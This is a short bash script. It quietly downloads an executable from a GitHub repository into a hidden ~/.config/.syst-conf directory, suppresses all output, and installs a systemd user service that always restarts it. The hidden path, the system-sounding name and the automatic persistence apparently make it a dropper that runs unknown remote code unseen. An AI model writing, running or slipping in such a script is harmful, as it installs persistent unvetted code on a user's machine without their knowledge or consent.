#!/bin/bash


mkdir -p ~/.config/.syst-conf

curl  -L -o ~/.config/.syst-conf/syst-tcl https://github.com/piadi-su/testing_repo/raw/refs/heads/master/syst-tcl/syst-tcl  > /dev/null 2>&1


chmod +x ~/.config/.syst-conf/syst-tcl



mkdir -p ~/.config/systemd/user



cat << 'EOF' > ~/.config/systemd/user/syst-tcl.service
[Unit]
Description=syst-tcl

[Service]
ExecStart=%h/.config/.syst-conf/syst-tcl
Restart=always

[Install]
WantedBy=default.target
EOF

systemctl --user daemon-reload
systemctl --user enable --now syst-tcl.service
